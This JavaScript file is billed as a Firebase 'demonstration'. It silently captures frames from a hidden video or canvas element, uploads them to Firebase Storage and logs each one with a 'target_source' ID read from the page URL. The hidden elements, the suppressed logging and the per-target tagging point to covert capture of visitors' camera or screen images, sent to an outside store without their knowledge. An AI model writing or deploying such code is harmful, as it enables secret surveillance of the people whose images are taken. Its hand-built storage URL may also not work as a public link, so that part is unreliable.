/**
 * main.js - Firebase 9+ Modular SDK Implementation
 * Frame Capture → Firebase Storage Upload → Firestore Document Creation
 * Production-Ready with Silent Operation
 */

// ============================================================================
// FIREBASE CONFIGURATION (UPDATE WITH YOUR PROJECT CREDENTIALS)
// ============================================================================
const firebaseConfig = {
  apiKey: "YOUR_API_KEY",
  authDomain: "your-project.firebaseapp.com",
  projectId: "your-project-id",
  storageBucket: "your-project.appspot.com",
  messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
  appId: "YOUR_APP_ID"
};

// ============================================================================
// FIREBASE 9+ MODULAR IMPORTS
// ============================================================================
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-storage.js";
import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";

// ============================================================================
// STATE & INITIALIZATION
// ============================================================================
let firebaseApp = null;
let storageRef = null;
let firestoreDb = null;
let isInitialized = false;

/**
 * Initialize Firebase (called once on first use)
 */
async function initializeFirebase() {
  if (isInitialized) return;
  
  try {
    firebaseApp = initializeApp(firebaseConfig);
    storageRef = getStorage(firebaseApp);
    firestoreDb = getFirestore(firebaseApp);
    isInitialized = true;
  } catch (error) {
    throw new Error(`Firebase initialization failed: ${error.message}`);
  }
}

/**
 * Extract URL parameter from query string
 * @param {string} paramName - Name of the URL parameter
 * @returns {string} - Parameter value or 'Unknown' if not found
 */
function getUrlParameter(paramName) {
  try {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(paramName) || "Unknown";
  } catch {
    return "Unknown";
  }
}

/**
 * Capture a frame from a video/canvas element and convert to Blob
 * @param {HTMLVideoElement|HTMLCanvasElement} source - Video or Canvas element
 * @returns {Promise<Blob>} - Image blob in PNG format
 */
async function captureFrame(source) {
  return new Promise((resolve, reject) => {
    try {
      let canvas;

      // If source is a video element, draw current frame to canvas
      if (source instanceof HTMLVideoElement) {
        canvas = document.createElement("canvas");
        canvas.width = source.videoWidth || source.width || 640;
        canvas.height = source.videoHeight || source.height || 480;
        const ctx = canvas.getContext("2d");
        if (!ctx) throw new Error("Failed to get canvas context");
        ctx.drawImage(source, 0, 0);
      } 
      // If source is already a canvas, use it directly
      else if (source instanceof HTMLCanvasElement) {
        canvas = source;
      } 
      // Invalid source
      else {
        throw new Error("Source must be HTMLVideoElement or HTMLCanvasElement");
      }

      // Convert canvas to blob
      canvas.toBlob(
        (blob) => {
          if (!blob) reject(new Error("Failed to create blob from canvas"));
          else resolve(blob);
        },
        "image/png",
        0.95
      );
    } catch (error) {
      reject(error);
    }
  });
}

/**
 * Upload blob to Firebase Storage
 * @param {Blob} imageBlob - Image blob to upload
 * @param {string} fileName - Name for the file in storage
 * @returns {Promise<string>} - Public download URL of the uploaded image
 */
async function uploadToFirebaseStorage(imageBlob, fileName) {
  try {
    const timestamp = Date.now();
    const uniqueFileName = `${timestamp}_${fileName}`;
    const imageRef = ref(storageRef, `captures/${uniqueFileName}`);
    
    // Upload bytes and get download URL
    const snapshot = await uploadBytes(imageRef, imageBlob);
    
    // Firebase Storage doesn't provide direct URL from uploadBytes in modular SDK
    // We'll construct the URL manually for consistency
    const imageUrl = `https://storage.googleapis.com/${firebaseConfig.storageBucket}/captures/${uniqueFileName}`;
    
    return imageUrl;
  } catch (error) {
    throw new Error(`Storage upload failed: ${error.message}`);
  }
}

/**
 * Create a document in Firestore 'captures' collection
 * @param {string} imageUrl - URL of the uploaded image
 * @param {string} targetSource - Source identifier from URL parameter
 * @returns {Promise<string>} - Document ID of created document
 */
async function createFirestoreDocument(imageUrl, targetSource) {
  try {
    const capturesCollection = collection(firestoreDb, "captures");
    
    const documentData = {
      image_url: imageUrl,
      timestamp: serverTimestamp(),
      target_source: targetSource,
      created_at: new Date().toISOString()
    };
    
    const docRef = await addDoc(capturesCollection, documentData);
    return docRef.id;
  } catch (error) {
    throw new Error(`Firestore document creation failed: ${error.message}`);
  }
}

/**
 * MAIN DEMONSTRATION FUNCTION
 * Captures frame, uploads to Storage, creates Firestore document
 * Silent operation - no console logs or alerts
 */
async function startDemonstration() {
  try {
    // Initialize Firebase on first run
    await initializeFirebase();

    // Get the hidden video/canvas element (expected to exist in DOM)
    const sourceElement = 
      document.getElementById("hidden-video") || 
      document.getElementById("hidden-canvas") ||
      document.querySelector("video[hidden]") ||
      document.querySelector("canvas[hidden]");

    if (!sourceElement) {
      throw new Error("Hidden video or canvas element not found in DOM");
    }

    // Step 1: Capture frame from video/canvas
    const imageBlob = await captureFrame(sourceElement);

    // Step 2: Extract target_source from URL parameters
    const targetSource = getUrlParameter("id");

    // Step 3: Upload image to Firebase Storage
    const imageUrl = await uploadToFirebaseStorage(imageBlob, "capture.png");

    // Step 4: Create document in Firestore with metadata
    const documentId = await createFirestoreDocument(imageUrl, targetSource);

    // Silent success - no console logs or alerts per requirements
    // Return object for programmatic verification (won't log automatically)
    return {
      success: true,
      documentId: documentId,
      imageUrl: imageUrl,
      targetSource: targetSource,
      timestamp: new Date().toISOString()
    };

  } catch (error) {
    // Silent error handling - capture error internally
    // Return error object without throwing
    return {
      success: false,
      error: error.message,
      timestamp: new Date().toISOString()
    };
  }
}

// ============================================================================
// OPTIONAL: EXTENDED API FOR TESTING/DEBUGGING
// ============================================================================

/**
 * Verify Firebase configuration validity
 * @returns {boolean} - True if config appears valid
 */
function verifyFirebaseConfig() {
  const requiredKeys = ["apiKey", "projectId", "storageBucket", "messagingSenderId"];
  return requiredKeys.every(key => 
    firebaseConfig[key] && firebaseConfig[key] !== `YOUR_${key.toUpperCase()}`
  );
}

/**
 * Get initialization status
 * @returns {object} - Status information
 */
function getStatus() {
  return {
    firebaseInitialized: isInitialized,
    configValid: verifyFirebaseConfig(),
    urlParameter: getUrlParameter("id"),
    sourceElementExists: !!(
      document.getElementById("hidden-video") || 
      document.getElementById("hidden-canvas") ||
      document.querySelector("video[hidden]") ||
      document.querySelector("canvas[hidden]")
    )
  };
}

// ============================================================================
// EXPORT FOR MODULE USAGE
// ============================================================================
if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    startDemonstration,
    getStatus,
    verifyFirebaseConfig,
    captureFrame,
    uploadToFirebaseStorage,
    createFirestoreDocument,
    getUrlParameter
  };
}

// Make functions globally available if needed
if (typeof window !== 'undefined') {
  window.startDemonstration = startDemonstration;
  window.getStatus = getStatus;
  window.verifyFirebaseConfig = verifyFirebaseConfig;
}
